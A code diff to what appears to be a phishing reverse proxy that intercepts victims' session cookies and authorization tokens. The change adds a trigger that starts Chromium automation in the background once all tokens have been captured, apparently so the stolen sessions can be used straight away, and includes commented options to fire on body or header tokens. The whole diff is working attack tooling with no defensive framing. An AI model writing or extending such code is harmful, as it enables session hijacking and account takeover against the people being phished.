@@ -900,6 +900,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			trigger := 0
+
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
 				if u, err := url.Parse(allow_origin); err == nil {
@@ -1015,6 +1017,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								token_re := v.search.FindStringSubmatch(string(body))
 								if token_re != nil && len(token_re) >= 2 {
 									s.BodyTokens[k] = token_re[1]
+//									trigger = 1   ←- If you need to capture BodyTokens
 								}
 							}
 						}
@@ -1026,6 +1029,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							hv := resp.Request.Header.Get(v.header)
 							if hv != "" {
 								s.HttpTokens[k] = hv
+//								trigger = 1   ←- If you need to capture HttpTokens
 							}
 						}
 					}
@@ -1037,9 +1041,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
 						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
 							is_body_auth = true
+							
 						}
 						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
 							is_http_auth = true
+							
 						}
 					}
 				}
@@ -1050,6 +1056,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+						trigger = 1
 
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 							log.Error("database: %v", err)
@@ -1237,6 +1244,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
+
+			if trigger == 1 {
+			    go func() {
+			      if err := core.TriggerChromium(); err != nil {
+			          log.Printf("Chromium automation failed: %v", err)
+			       } else {
+			          log.Println("Chromium automation started successfully")
+			       }
+			    }()
+			}   
 
 			return resp
 		})
